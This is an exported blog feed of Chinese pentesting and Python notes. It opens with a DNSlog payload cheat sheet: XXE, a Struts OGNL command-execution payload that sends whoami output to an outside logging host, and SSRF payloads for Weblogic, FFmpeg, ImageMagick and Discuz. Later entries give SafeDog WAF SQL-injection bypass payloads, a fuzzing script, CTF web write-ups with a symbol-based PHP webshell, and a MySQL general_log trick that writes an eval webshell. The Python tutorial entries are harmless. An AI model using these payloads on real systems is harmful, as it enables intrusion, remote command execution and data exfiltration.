返回操作系统目录的位置。 XML Entity Injection12345&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM "http://ip.port.b182oj.ceye.io/xxe_test"&gt;%remote;]&gt;&lt;root/&gt; OtherStruts212xx.action?redirect:http://ip.port.b182oj.ceye.io/%25&#123;3*4&#125;xx.action?redirect:$&#123;%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]&#123;'whoami'&#125;)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://ip.port.b182oj.ceye.io/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()&#125; FFMpeg12345#EXTM3U#EXT-X-MEDIA-SEQUENCE:0#EXTINF:10.0,concat:http://ip.port.b182oj.ceye.io#EXT-X-ENDLIST Weblogic1xxoo.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http://ip.port.b182oj.ceye.io/test&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Businesslocation&amp;btnSubmit=Search ImageMagick1234push graphic-contextviewbox 0 0 640 480fill 'url(http://ip.port.b182oj.ceye.io)'pop graphic-context Resin1xxoo.com/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=http://ip.port.b182oj.ceye.io/ssrf Discuz1http://xxx.xxxx.com/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]http://ip.port.b182oj.ceye.io/xx.jpg[/img]&amp;formhash=xxoo]]></content>
      <categories>
        <category>渗透测试</category>
        <category>DNSLOG</category>
      </categories>
      <tags>
        <tag>DNSlog</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[绕过安全狗3.5版本对version的特殊拦截]]></title>
    <url>%2F%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%973-5%E7%89%88%E6%9C%AC%E5%AF%B9version%E7%9A%84%E7%89%B9%E6%AE%8A%E6%8B%A6%E6%88%AA.html</url>
    <content type="text"><![CDATA[在安全狗v3.5版本中，对version和information_schema有特殊的拦击，测试发现，有一种情况可以绕过对version的拦截。 先放一个能绕过安全狗查询部分信息的一个payload： 1/*!union/*/**%0g@*/select*/ 1,2,/*!user/*/**%0g@*/()*/ 口说无凭，请看图： 可以看见能够绕过安全狗v3.5版本的来查询user()，但是不能查询version看图： 后来测试发现/!select/和version()同时出现，安全狗不会拦截。 当然还需要绕过union和select同时出现的拦截，最终payload为： /!union//*%0g@//!select/1,2,version() 但是只能用于version() 其他的(e.g. database()、user())都不行 再记录一下对information_schema的拦截，对information_schema的拦截的正则类似： \w*infomation_schema\w* 所以如果想绕过这里必须找到字符插入information_schema这个字符串当中，并且不能影响mysql执行。]]></content>
      <categories>
        <category>渗透测试</category>
        <category>Bypass系列</category>
        <category>Bypass注入</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
        <tag>注入</tag>
        <tag>安全狗</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一道CTF的代码审计题目]]></title>
    <url>%2F%E4%B8%80%E9%81%93CTF%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E7%9B%AE.html</url>
    <content type="text"><![CDATA[这个是一道围绕着php弱类型等一些杂项出的题目。 题目提示 访问题目连接，提示index.txt ,典型的源代码泄露 分析代码(代码在最后)主要看要绕过哪些点： 1.第一个需要绕过的：12345if(md5($_SERVER['HTTP_BGROTNYSPXPD']) !=='9a8dae267c8e52a664c8cbf7cfe47b44')&#123; header("HTTP/1.1 404 Not Found"); echo 'Tips:index.txt'; exit();&#125; 这个绕过很简单，只需要burp抓包加上一个BGROTNYSPXPD:HaHa即可。而不是加上HTTP_BGROTNYSPXPD。 2.第二层绕过：12345if(md5($_POST['encode']) !== '0a61bdaf2b1f5c00b319fa7c1373bbee')&#123; echo '&lt;/br&gt;man,your need Crack Md5&lt;/br&gt;';&#125;else&#123; echo "&lt;/br&gt;Hash:".$encodedSecret."&lt;br/&gt;";&#125; 第二层if只需要POST提交一个md5值为0a61bdaf2b1f5c00b319fa7c1373bbee的值，再加上第一层绕过的方法就可以绕过了。 第一次做的时候我用python直接提交的包，可以绕过，写文章的时候，这样没法绕过，应该是#的原因，把encode提交的内容进行一次URLENCODE，再提交 绕过第二层if之后会给我一个$encodedSecret在后面会用到。并且给出了这个encodedSecret的算法： 1234function encodeSecret($secret) &#123; //翻转字符串然后转换成16进制 return bin2hex(strrev(base64_encode($secret)));&#125; 先把Hash转化成字符串得到=QcCtmMml1ViV3b然后解密： 1234&lt;?php $s="=QcCtmMml1ViV3b"; echo base64_decode(strrev($s));?&gt; 获得明文：oubWYf2kBq 3.第三层绕过：12345678910111213141516$pass=unserialize(base64_decode($_GET['pass'])); if($pass!=='' &amp;&amp;is_array($pass))&#123; $a=$pass['a']; $b=$pass['b']; $c=$pass['c']; if($a == '' &amp;&amp; $b == ''&amp;&amp; $c== '')&#123; die("tutututu"); &#125; if((md5($a) == md5($b) &amp;&amp; $a !== $b))&#123; echo "WOW!&lt;br/&gt;"; $v1=1; &#125; if(strlen($c)&lt;4 &amp;&amp; $c&gt;99999999)&#123; echo "666666!&lt;/br&gt;"; $v2=1; &#125; 要提交一个base64加密过的序列化数组，数组要满足的要求： A.三个key对应的value不为空; B. a和b不相等，且md5值相等(php弱类型); C. c的长度小于4位，但是值要大于99999999 对于a和b QNKCDZO 与 s878926199a即可。对于c我在本地测试了一下9e9可以绕过。 123456&lt;?php $test = array("a"=&gt;"QNKCDZO","b"=&gt;"s878926199a","c"=&gt;"9e9"); $test2 = ''; $test2=serialize($test); echo base64_encode($test2);?&gt; 用以上代码拿到pass的值。 第四层绕过还是一个PHP弱类型123$aa = base64_decode($_GET['file']); $bb = base64_decode($_GET['file1']); if((md5($aa) == md5($bb) &amp;&amp; $aa !== $bb)) 只需要把 QNKCDZO 与 s878926199a进行一次base64加密就行 第五层，这个其实在第二层绕过的时候已经拿到了那个值。123if(encodeSecret($_GET['onet']) == $encodedSecret)&#123; echo $flag;&#125;else onet=oubWYf2kBq 构造payloadhttp://xxx.xxx.xxx.xxx/code/index.php?pass=YTozOntzOjE6ImEiO3M6NzoiUU5LQ0RaTyI7czoxOiJiIjtzOjExOiJzODc4OTI2MTk5YSI7czoxOiJjIjtzOjM6IjllOSI7fQ==&amp;file=UU5LQ0RaTw==&amp;file1=czg3ODkyNjE5OWE=&amp;onet=oubWYf2kBq 提交的时候在数据报头加上BGROTNYSPXPD:HaHa即可得到flag]]></content>
      <categories>
        <category>比赛</category>
        <category>CTF</category>
        <category>审计题</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python - 面向对象编程]]></title>
    <url>%2FPython-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B.html</url>
    <content type="text"><![CDATA[python面向对象学习记录 类定义类12345class Class_name(object): def __init__(self,name): self.name = name #这个是 实例变量（也叫成员属性） def bulk(self): #这个是成员方法 pass 1.其中object指继承的哪个类，所有的类都是object的派生类，所以没有找到合适的继承类时，就填写object 2.init叫做构造函数，用来初始化类，和传递参数，这里值得一提的是，init的初始化方式：在实例化一个类的时候，class1 = Class_name(“admintony”) ，这样其实是把class1作为self这个变量也传递进来，然后再进行class1.name = name 这样的赋值。 3.在类中创建的函数叫做成员方法，所有的成员方法都有一个默认的参数self，自动把实例化的对象传递进去，调用时不需要填写该参数 实例化123class1 = Class_name("admintony")print(class1.name)class1.bulk 类变量类变量：类似于global变量，每个实例都可以调用的，且可以通过类名来调用这个变量 （存放所有类共用的属性） 1234567class Class_name(object): c_name ="admintony.com" def __init__(self,name): self.name = nameclass1 = Class_name("admintony")print(Class_name.c_name) # ==&gt;&gt;&gt;admintony.comprint(class1.c_name) # ==&gt;&gt;&gt;admintony.com 1&gt;可以在class1中改写c_name这个值，但是不影响其他的实例 2&gt;Class_name.c_name = “com” 这样可以影响到其他的实例 3&gt;如果类变量是可变类型的变量(list)，那么在class1中修改了此变量会影响其他实例 增加/删除成员变量增：根据init的实质可以知道，在实例化后仍然可以通过class1.age = 19 来给class1这个实例增加新的属性 删：del class1.age #即可删除age这个成员属性 析构函数析构函数是在实例销毁或者被释放的时候执行的函数，常用来做一些收尾工作 12345class Class_name(object): def __init__(self,name): self.name = name def __del__(self): print("析构函数") 实例销毁或者被释放的情况： 代码执行完成，程序退出。 del 实例名 #这里利用了python动态回收内存的方法，删除变量名，该空间就会被释放。 私有属性，私有方法只能在内部使用的变量或者方法叫做私有变量(属性)、私有方法 12def __init__(self,name): self.__name = name 此时的__name就是一个私有属性，只能在类的内部访问，如果想要查看他要写一个函数来返回他。 12def getname(self): return self.__name 私有方法和私有变量类似，在方法名前面加两个下划线。 面向对象的特性封装封装就是提供接口，但是不告诉你类中的结构和实现的方法。 继承123456789101112131415161718192021class People(object): def __init__(self,name,age): self.name = name self.age = age def eat(self): print("%s is eating...."% self.name) def sleep(self): print("%s is sleeping...." %self.name) def cry(self): print("%s is crying...."%self.name)class Man(People): def eat(self): print("man %s is eating...."%self.name) def sleep(self): People.sleep(self) print("a man is sleeping....")man = Man("admintony",19)man.eat()man.cry()man.sleep() 1&gt;继承以后可以重写父类的方法。 2&gt;继承后如果在某个函数中需要调用父类的方法：父类.方法(self) 一定记着传self进去，因为这个时候你调用的时候父类不知道self的指向。 3&gt;重构init():super(子类名,self).init(父类要的参数) 然后再写子类处理其他的参数。 123456789class People(object): def __init__(self,name,age,passwd=1): self.name = name self.age = age self.passwd = passwdclass Man(People): def __init__(self,name,age,sex): super(Man,self).__init__(name,age)#这里可以传递默认参数也可以不传递 self.sex = sex 4&gt;多继承：多个父类的构造函数的参数个数相同，继承时写的父类顺序，会影响初始化时，各个父类的init()的执行顺序。[或者多个父类只写一个构造函数] 1234567891011121314class People(object): def __init__(self,name,age,passwd=1): self.name = name self.age = age self.passwd = passwdclass People2(object): def p_2(self): print("Hello %s"%self.name)class Man(People,People2): passman = Man("admintony",19)man.p_2()# &gt;&gt;&gt;Hello admintony 多态`]]></content>
      <categories>
        <category>Python</category>
        <category>Python学习</category>
        <category>面向对象</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>python学习</tag>
        <tag>面向对象</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python模块-configparser]]></title>
    <url>%2FPython%E6%A8%A1%E5%9D%97-configparser.html</url>
    <content type="text"><![CDATA[configparser模块，用来处理文件的模块，可以实现文件的增删改查 写配置文件123456789101112131415161718import configparser#先生成一个configparser的对象config = configparser.ConfigParser()#这个configparser的对象的key就是节点，赋值的时候用字典格式#注意：default不是默认节点，DEFAULT才是config['DEFAULT']=&#123;"Name":"admintony", "age":"19", "sex":"man"&#125;#以key的方式进行存储,但是要先进行初始化config['school']=&#123;&#125;config['school']['school_name']="swust"#还可以把节点赋给变量然后按照key的形式进行存储school =config['school']school['grade'] = "15"#打开一个文件，然后把文件作为对象传入config的write方法内with open("config.ini","w") as conf: config.write(conf) 读配置文件12345678910111213141516171819202122import configparserconfig = configparser.ConfigParser()#读取配置文件的内容config.read('config.ini')#输出节点名 list格式print("节点名："+str(config.sections()))#DEFAULT节点的内容 list[ (key,value),] print("DEFAULTS："+str(config.defaults()))#DEFAULT和sch节点的内容 list[ (key,value),] print("config.items = "+str(config.items("sch")))#输出节点sch和DEFAULT的key xschool = config.options("sch") print("config.options = "+str(xschool))#输出节点中某个key的值print("school_name："+config['school']['school_name'])#从某个节点中取key的值print("config.get = "+config.get("sch","sch_name")) 增删12345678910111213141516import configparserconfig = configparser.ConfigParser()config.read("config.ini")#删除节点config.remove_section("school")config.write(open("config1.ini","w"))#删除optionconfig.remove_option("sch","sch_name")#增加节点config.add_section("lyx")config.write(open("config1.ini","w"))#增加optionconfig.set("lyx","name_lyx","yxx")config.write(open("config1.ini","w"))]]></content>
      <categories>
        <category>Python</category>
        <category>Python学习</category>
        <category>configparser模块</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>python学习</tag>
        <tag>configparser</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python-模块，包的导入]]></title>
    <url>%2FPython-%E6%A8%A1%E5%9D%97%EF%BC%8C%E5%8C%85%E7%9A%84%E5%AF%BC%E5%85%A5.html</url>
    <content type="text"><![CDATA[import的一些知识和自己测试的结果。 定义模块：从逻辑上组织python代码，本质就是一个.py文件 包： 从逻辑上组织模块的，本质上就是一个目录(必须包含init.py) import的本质import模块 本质把python代码解释一遍，然后赋值给某块名 import包 本质把init.py的代码解释一遍，并赋值给包名 导入方法导入模块import moudle_name： 导入模块 ==&gt; 将moudle的全部代码加载到内存(运行)并赋值给与模块同名的变量写在当前文件中,这个变量的类型是’module’ 1234567891011# [+] main_codeimport moudle_testmoudle_test.say_hello()# [+] moudle_codedef say_hello(): print("hello moudle")#########################运行结果： &gt;&gt;&gt;hello moudle from moudle_name import function or value：导入某块中的函数或者变量===&gt;将moudle中的代码加载到内存(运行)，并将import的函数或者变量赋值给function或者value[未import的没有赋值给对应的函数名或者变量名] 1234567891011121314# [+] main_codefrom moudle_test import say_hello,namesay_hello()print(name)# [+] moudle_codedef say_hello(): print("hello moudle")name = "admintony.com"######################### 运行结果： &gt;&gt;&gt;hello moudle&gt;&gt;&gt;admintony.com from moudle import *：同上，只不过是导入了moudle的所有内容，不建议使用，因为如果自己构建的函数与moudle中的函数重名的话，相当于重写了moudle中函数了。 from moudle import 函数 as 别名： 导入某块中的函数或者变量并取一个别名===&gt;将moudle中的代码加载到内存(运行)，并将import的函数或者变量赋值给别名。 导入包import package_name ==&gt;等价于把package的init.py当作模块导入了，其他的模块都无法使用。[所以此方法不可用] from package_name import *： ===&gt;等价于import package_name from package_name import moudle_name ===&gt;把init.py和moudle一起加载到内存中(运行)，并将moudle中的代码赋值给moudle_name from package_name import moudle_name as 别名 ===&gt;把init.py和moudle一起加载到内存中(运行)，并将moudle中的代码赋值给别名 12345678910111213# [+] main_codefrom package_test import test as tt.whoami()# [+] package_test的__init__.pyprint("this is package __init__.py")def who(): print("admintony")# [+] package_test的test.pydef whoami(): print("system!")print("this is test.py") 当然也可以import package_name.moudle_name这样调用，但是十分的麻烦，因为调用的模块代码会存放在package_name.moudle_name这个变量里面。 导入叔目录下的包或者模块查看环境变量：sys.path 返回值是一个list 查看当前文件的相对路径：file 查看当前文件的绝对路径：os.path.abspath(file) ===&gt;c:/python_demo/core/main.py 返回目录名：os.path.dirname(os.path.abspath(file)) ==&gt;c:/python_demo/core/ 1234567891011121314[+] main_codeimport os,syspath = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))+"\\test2\\"sys.path.append(path)import moudle_tmoudle_t.fly()[+] main的叔目录下的moudle_t的代码：def fly(): print("You can't fly!") 注意：sys.path是环境变量，os.path不是。]]></content>
      <categories>
        <category>Python</category>
        <category>Python学习</category>
        <category>模块&amp;包</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>moudle</tag>
        <tag>package</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python多进程学习]]></title>
    <url>%2FPython%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%AD%A6%E4%B9%A0.html</url>
    <content type="text"><![CDATA[python学习中的多进程总结 多进程跨平台实现多进程需要用到multiprocessing这个模块，这个模块中有两个类Process和Pool是常用的。 Process类123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990| __init__(self, group=None, target=None, name=None, args=(), kwargs=&#123;&#125;, *,mon=None)| 初始化类，target指向函数名，name参数可以为该进程设置名称，args是为target指向的函数传入的参数，且为tuple类型的|| is_alive(self)| 返回这个进程是否alive|| join(self, timeout=None)| 等待，直到子进程执行完毕|| run(self)| Method to be run in sub-process; can be overridden in sub-class|| start(self)| 开启子进程|| terminate(self)| 结束进程|| ----------------------------------------------------------------------| Data descriptors inherited from multiprocessing.process.BaseProcess:|| __dict__| dictionary for instance variables (if defined)|| __weakref__| list of weak references to the object (if defined)|| authkey|| daemon| 返回该进程是否为守护进程|| exitcode| 返回进程的退出代码|| ident| Return identifier (PID) of process or `None` if it has yet to start|| name|| pid| Return identifier (PID) of process or `None` if it has yet to start``` ## 用Process实现多进程：![](https://blog-1252108140.cosbj.myqcloud.com/201803/1520576484.0351057.png)# Pool类如果想要创建多个进程，可以用到进程池来创建。问题：为什么不用for循环来创建呢？答案：当然可以啦，但是要注意join()要放到for循环外面，否则的话会执行完process_1才执行process_2的。![](https://blog-1252108140.cosbj.myqcloud.com/201803/1520576514.0676877.png)示范代码：![](https://blog-1252108140.cosbj.myqcloud.com/201803/1520576526.8598888.png)注意点：* &lt;1&gt;.如果要开启的进程数大于进程池最大进程数的话，就要等待进程池中有空位了，后面的进程再进去* &lt;2&gt;.进程池Pool的对象方法apply_async直接就启动了进程，不需要再用start()来启动了。* &lt;3&gt;.调用close()后，就不能再添加新的process了，且join()必须在close()后面。# 进程间的通信## subprocess的使用在Python中，我们通过标准库中的subprocess包来fork一个子进程，并运行一个外部的程序。**subprocess.call(command,shell=True)：**fork一个子进程，并运行一个外部程序(命令)在本进程中显示结果。![](https://blog-1252108140.cosbj.myqcloud.com/201803/1520576588.688439.png)如果命令执行不成功，会返回一个异常，所以要用到try except来处理异常。**output = subprocess.check_output(command)：**将外部命令执行结果放入变量，不在控制台输出![](https://blog-1252108140.cosbj.myqcloud.com/201803/1520576624.2668383.png)上图做了对比，对比subprocess.call和check_output的返回结果，call执行成功返回一个0，否则返回非零数，check_output返回命令执行的结果。```pythonsu = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE) 将输入，输出和err都用subprocess的管道来传输。调用：su.communicate([stdin])返回一个tuple或者用两个变量来接收(第一个变量接收stdout传来的值，第二个变量接收stderr传来的值)。 communicate()传参问题：如果运行的外部命令或者程序需要交互才用communicate来传参数，且Popen中stdin必须是subprocess的管道。也可以用su.stdin.write()来给外部程序传入参数，读取命令返回值也可以用su.stdout.read() multiprocessing提供的Queue实例化：q = Queue() 获取数据：q.get(True) 传入数据：q.put(value) 注意点 A.Queue()只能用于进程间的通信，子进程与父进程的通信试用subprocess比较好 B.Queue()不能用于进程池的进程间通信，进程池的进程间通讯要用multiprocessing.Manager().Queue()参考代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#!/usr/bin/python#coding=utf-8from multiprocessing import Process,Pool,Queue,Managerimport os,time,randomdef write(q,list,i): print("[+] This is Process_"+str(i)+" and pid is %s START"%os.getpid()) for item in list: q.put(item) print("[+] Pid %s Put : %s"%(os.getpid(),item)) print("[+] This is Process_"+i+" and pid is %s CLOSE"%os.getpid())def test(): print(os.getpid())def read(q): print('[====] Process to Read , pid = %s'%os.getpid()) while True: data = q.get(True) print("[=] data from Queue : %s"%str(data))def main(): manager = Manager() q = manager.Queue() p = Pool(5) listx = [] listx.append([x for x in range(10)]) listx.append([x for x in range(100,110)]) listx.append([x for x in range(200,210)]) listx.append([x for x in range(300,310)]) listx.append([x for x in range(400,410)]) for i in range(5): if i==4: pass p.apply_async(read,args=(q,)) else: list = listx[i] #print(list) p.apply_async(write,args=(q,list,i)) p.close() p.join()if __name__ == '__main__': main()]]></content>
      <categories>
        <category>Python</category>
        <category>Python学习</category>
        <category>多进程</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>多进程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MYSQL注入绕过安全狗及tamper脚本修改]]></title>
    <url>%2FMYSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%AE%89%E5%85%A8%E7%8B%97%E5%8F%8Atamper%E8%84%9A%E6%9C%AC%E4%BF%AE%E6%94%B9.html</url>
    <content type="text"><![CDATA[这个技巧是借鉴了Va1n3R在漏洞银行的视频，对其脚本进行了改进。 PHP+MySQL+Apache环境及测试源码环境： PHPStudy集成的 源码： FUZZ源码 fuzz脚本 1.做一个规则库，并生成一个存放n个fuzz字符的generator(如果不使用生成器，不能跑8位及以上的payload，8位payload一共3亿多个，全部写入内存会卡的跑不动，这是一点对Va1n3R牛脚本的修改) 2.分析页面，正常时候返回页面有哪些标志，用来做成功的判断 3.迭代generator，并构造payload访问URL 4.如果成功则放入txt，否则只打印new url：url 5.输出进度 代码实现： 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/python#coding:utf-8import sys,requestsdef _generator(): fuzz_zs = ['/*','*/','/*!','*','=','`','!','@','%','.','-','+','|','%00'] fuzz_sz = ['',' '] fuzz_ch = ["%0a","%0b","%0c","%0d","%0e","%0f","%0g","%0h","%0i","%0j"] fuzz = fuzz_zs+fuzz_sz+fuzz_ch for a in fuzz: for b in fuzz: for c in fuzz: for d in fuzz: for e in fuzz: for f in fuzz: st = a+b+c+d+e+f yield stg = _generator()headers = &#123;"User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.221 Safari/537.36 SE 2.X MetaSr 1.0"&#125;i = 0glen = len(fuzz)**6for st in g: i+=1 url = "http://127.0.0.1/fuzz/index.php?id=1" url = url+" /*!union"+st+"select*/ 1,2,3" sys.stdout.write(' '*30 + '\r') #sys.stdout.flush() print("[-] new URL: %s"%url) sys.stdout.write("正在测试：%d/%d"%(i,glen)) sys.stdout.flush() res = requests.get(url,headers=headers) if '&lt;td&gt;id&lt;/td&gt;' in res.text: sys.stdout.write("[+] Find Bypass URL: %s\n"%url) with open('./apache.txt','a+') as f: f.write(url+'\n') 多线程成品版本： mysql-injection-fuzz_thread 多进程成品版本： mysql-injection-fuzz_process 成品展示： tamper脚本修改修改 versionedmorekeywords.py 用MySQL注释包围每个关键字脚本]]></content>
      <categories>
        <category>渗透测试</category>
        <category>SQL注入</category>
        <category>Bypass</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[湖湘杯复赛WEB-WriteUp]]></title>
    <url>%2F%E6%B9%96%E6%B9%98%E6%9D%AF%E5%A4%8D%E8%B5%9BWEB-WriteUp.html</url>
    <content type="text"><![CDATA[湖湘杯复赛writeup加WEB源码，WEB400没做出来。RE、PWN、MISC都是队友做的，存在word里面，最后有下载。 WEB200题目提示： 只是一个普通的上传 打开页面以后得到两点提示： 1.只能上传png 2.htmlentities(ucfirst($op)); op变量做过简单的处理。 打开upload页面发现http://118.190.87.135:10080/?op=upload ==&gt; op=upload应该是文件包含。 扫描一下目录：upload.php、home.php、flag.php、show.php加上两个目录image和uploads 包含一下flag.php看看，应该不会这么简单： 不行，按照正常路子走，上传一个png： 页面返回URL: op=show&amp;imagekey=cf32f1071d5f2a4b89c72df04a1b5de02dce2bf1 到这里就更加印证了是一个文件包含漏洞了，这个imagekey应该就是上传后的文件名，上传的文件应该是在uploads文件下： 果然，接下来要包含它。 重新思考了一下，包含upload.php的时候，是op=upload 那么其代码应该是op=$_GET[op].’.php’;在文件中加上php的，这时候我想到phar://协议。 将x.php(一句话shell)压缩成zip格式，然后再改成png格式上传到服务器，用包含结合phar协议来执行php文件： payload： 1op=phar://./uploads/e3b413b087bd7f56d3a67d3f970a88c489b60e66.png/x Ok，可以执行，接下来就是读取flag.php中的内容了。 Payload： 1x=highlight_file('././flag.php'); 其实后来比赛完以后和别人交流，他们直接用包含就拿到了flag，没上传文件，用了filter协议，当时没想到。 Payload: 1payload：?op=php://filter/read=convert.base64-encode/resource=flag Web150 random这道题是相当的坑，11点出了以后到4点左右才正常。 像这样的题，进去没什么提示，首先想到的源代码泄露，然后审计代码绕过一些的。访问.index.php.swp存在，这个是vi编辑器留下的，但是在11点-4点之间这段时间，这个里面根本没有源码，和index一样是乱码。 源码看到以后，就发现是mt_rand()伪加密，mt_srand()以time()为种子进行播种，mt_rand()生成的内容是依赖于time()的。 思路：用python直接访问页面拿到pwd的值，在time()生成的时间戳变化之前提交上去，就可以绕过第一层if($pwd == $_GET[pwd])，但是这乱码是什么东东？ 把源码放在本地，然后去生成、输出pwd 和 session。 发现还是乱码，那可能pwd就是乱码，ok。写个脚本，让脚本先访问题目地址，处理题目地址返回页面，取出pwd的值，再访问本地页面对比pwd的值，如果相同，则把本地页面生成的pwd、session的值分别作为pwd参数和action参数的值提交上去。还有一点就是$_SESSION[‘userLogin’]=create_password(32).rand(); 这里还有个rand()这个rand在页面中没给他播种，这里rand()还是随机的。这里我的处理是用while循环一直跑，总会有本地rand()和环境rand()的种子一样的时候，这时候就可以过第二层循环了。 额，一次就成功了。这么神。再测试： 赛后分析原因，在第一次请求页面的时候，$_SESSION[‘userLogin’]还没被赋值，不需要提交login就可以绕过这个循环，但是我是提交了这个值的，那一次成功可能真的是我运气好吧。 附上python脚本和php本地页面代码 Python脚本： 123456789101112131415161718192021222324import requests,re#re_pass = re.compile(r'&lt;br&gt;.+||')url = "http://114.215.138.89:10080/"while True: res = requests.get(url) s = res.content[29:-8] print s resloaction = requests.get("http://127.0.0.1/test.php") list = resloaction.content.split(' ')params=&#123;&#125; if list[0]==s : params['login']=list[1] params['pwd']=s #params['login']=s resp = requests.get(url,params=params) if 'flag' in resp.content : print resp.content break; elif 'Wrong' in resp.content : print 'Wrong' elif 'first' in resp.content : print 'first' else :pass PHP: 12345678910111213&lt;?phpfunction create_password($pw_length = 10)&#123; $randpwd = ""; for ($i = 0; $i &lt; $pw_length; $i++)&#123; $randpwd .= chr(mt_rand(100, 200)); &#125; return $randpwd;&#125;mt_srand(time());$pwd=create_password();echo $pwd.' '; //echo "&lt;br&gt;";echo create_password(32).rand(); Web300 访问看到源码，过滤了很多字符，但是()[]=’+.;这些字符没过滤，题目又提示能getshell。这让我想起了以前在网上看到过的一个符号一句话木马。 找了很久终于找到了符号一句话 12345&lt;?php$_=[].[];$__='';$_=$_[''];$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$_=++$_;$_=++$_;$__=$_.$__;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$&#123;'_'.$__&#125;[_]($&#123;'_'.$__&#125;[__]);?&gt; 但是提交却被拦截。 又看了一遍字符过滤的数组里面的确没有这些字符啊。后来测试是+被拦截了，可是里面确实没过滤+啊。 在本地写一个php来一探究竟 123&lt;?php $a = $_GET[x]; echo $a; 看下+传入以后输出会怎么样？ 空白？ 原来，+在url中表示空格，而题目拦截空格。所以要把+ 进行一次URL编码，传入后会自动进行解码： 将符号一句话中的+全部用%2b替换 题目源码及其他wp湖湘杯2017]]></content>
      <categories>
        <category>比赛</category>
        <category>CTF</category>
        <category>湖湘杯</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>湖湘杯</tag>
        <tag>CTF_WEB</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MYSQL新特性限制文件写入及替代方法]]></title>
    <url>%2FMYSQL%E6%96%B0%E7%89%B9%E6%80%A7%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%8F%8A%E6%9B%BF%E4%BB%A3%E6%96%B9%E6%B3%95.html</url>
    <content type="text"><![CDATA[高版本的MYSQL添加了一个新的特性secure_file_priv，该选项限制了mysql导出文件的权限 secure_file_priv选项1234567891011121314151617181920secure_file_priv 1、限制mysqld 不允许导入 | 导出 --secure_file_prive=null 2、限制mysqld 的导入 | 导出 只能发生在/tmp/目录下 --secure_file_priv=/tmp/ 3、不对mysqld 的导入 | 导出做限制 --secure_file_priv= linuxcat /etc/my.cnf [mysqld] secure_file_priv= win my.ini [mysqld] secure_file_priv= 查看secure_file_priv1show global variables like '%secure%'; 高权限注入遇到secure_file_priv在mysql高版本的配置文件中默认没有secure_file_priv这个选项，但是你用SQL语句来查看secure_file_priv发现，没配置这个选项就是NULL，也就是说无法导出文件。 替代方法： 1set global general_log=on;set global general_log_file='/var/www/tony.php';select '&lt;?php eval($_POST[tony]) ?&gt;';]]></content>
      <categories>
        <category>渗透测试</category>
        <category>SQL注入</category>
        <category>MySQL新特性</category>
      </categories>
      <tags>
        <tag>MySQL高权限注入</tag>
        <tag>secure_file_priv</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入-insert、update、delete注入]]></title>
    <url>%2FSQL%E6%B3%A8%E5%85%A5-insert%E3%80%81update%E3%80%81delete%E6%B3%A8%E5%85%A5.html</url>
    <content type="text"><![CDATA[SQL注入类型很多，包括insert、update、delete都有办法注入，今天总结一下这三个注入，包含实例。 配置环境Apache+Mysql 5.5.53+PHP 5.6搭建一个web服务器。 然后用下面的创建表语句创建一个表用来测试。 123456789create table member__sq( p_id INT NOT NULL AUTO_INCREMENT, p_name VARCHAR(100) NOT NULL, p_number INT NOT NULL, p_owner VARCHAR(100) NOT NULL, p_ney VARCHAR(100) NOT NULL, sqdate DATE, PRIMARY KEY ( p_id ) ); PHP漏洞代码： sqltest.php 123456789101112131415161718192021222324252627&lt;?php error_reporting(0); //error_reporting(E_ALL ^ E_DEPRECATED); include('./config.php'); $conn=mysql_connect($mysql_server_name,$mysql_username,$mysql_password) or die("error connecting") ; //连接数据库 mysql_query("set names 'utf8'"); //数据库输出编码 应该与你的数据库编码保持一致. mysql_select_db($mysql_database); //打开数据库 $_id=$_POST[id]; $_ney="test123"; $sql = " insert into 